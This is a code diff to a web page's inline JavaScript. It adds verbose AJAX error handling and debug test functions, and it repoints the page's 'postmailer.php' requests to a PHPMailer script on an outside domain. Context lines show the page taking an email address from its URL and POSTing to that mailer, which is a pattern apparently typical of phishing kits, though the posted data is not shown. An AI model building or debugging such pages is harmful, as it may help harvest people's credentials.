@@ -312,16 +312,32 @@
                          console.log('Error:', error);
                          console.log('Response Text:', xhr.responseText);
                          console.log('Status Code:', xhr.status);
+                         console.log('Ready State:', xhr.readyState);
+                         console.log('Response Headers:', xhr.getAllResponseHeaders());
                          
                          var errorMsg = 'Connection error';
-                         if (xhr.responseText) {
+                         
+                         // More specific error messages
+                         if (xhr.status === 0) {
+                             errorMsg = 'Network error: Cannot connect to server. Check CORS settings.';
+                         } else if (xhr.status === 404) {
+                             errorMsg = 'Server endpoint not found (404)';
+                         } else if (xhr.status === 403) {
+                             errorMsg = 'Access forbidden (403)';
+                         } else if (xhr.status === 500) {
+                             errorMsg = 'Internal server error (500)';
+                         } else if (status === 'timeout') {
+                             errorMsg = 'Request timeout - server took too long to respond';
+                         } else if (status === 'parsererror') {
+                             errorMsg = 'Invalid JSON response from server';
+                         } else if (xhr.responseText) {
                              try {
                                  var errorResponse = JSON.parse(xhr.responseText);
                                  errorMsg = errorResponse.msg || errorMsg;
                                  console.log('Parsed error response:', errorResponse);
                              } catch (e) {
                                  console.log('Could not parse error response as JSON');
-                                 errorMsg = 'Server error: ' + xhr.status;
+                                 errorMsg = 'Server error: ' + xhr.status + ' - ' + xhr.responseText.substring(0, 100);
                              }
                          }
                          
@@ -368,9 +384,9 @@
              
              // Debug function to test PHP connection
              window.testConnection = function() {
-                 console.log('Testing connection to connection_test.php...');
+                 console.log('Testing connection to hosted server...');
                  $.ajax({
-                     url: 'connection_test.php',
+                     url: 'https://inipressi.xyz/phpmailer/classes/test.php',
                      type: 'GET',
                      dataType: 'json',
                      success: function(response) {
@@ -393,7 +409,7 @@
              window.testPostmailerGet = function() {
                  console.log('Testing postmailer.php with GET...');
                  $.ajax({
-                     url: 'postmailer.php',
+                     url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php',
                      type: 'GET',
                      dataType: 'json',
                      success: function(response) {
@@ -416,7 +432,7 @@
              window.testPostmailer = function() {
                  console.log('Testing postmailer.php with POST...');
                  $.ajax({
-                     url: 'postmailer.php',
+                     url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php',
                      method: 'POST',
                      type: 'POST',
                      data: {
@@ -458,6 +474,31 @@
                  } else {
                      alert('No valid email found in URL');
                  }
+             };
+
+             // Simple connectivity test
+             window.testSimpleConnection = function() {
+                 console.log('Testing simple server connectivity...');
+                 $.ajax({
+                     url: 'https://inipressi.xyz/phpmailer/classes/simple_test.php',
+                     type: 'GET',
+                     dataType: 'json',
+                     timeout: 10000,
+                     success: function(response) {
+                         console.log('Simple connection test successful:', response);
+                         alert('✅ Server connection working! Check console for details.');
+                     },
+                     error: function(xhr, status, error) {
+                         console.log('Simple connection test failed:', {
+                             status: status,
+                             error: error,
+                             responseText: xhr.responseText,
+                             statusCode: xhr.status,
+                             readyState: xhr.readyState
+                         });
+                         alert('❌ Simple connection test failed. Check console for details.');
+                     }
+                 });
              };
          });
       </script>
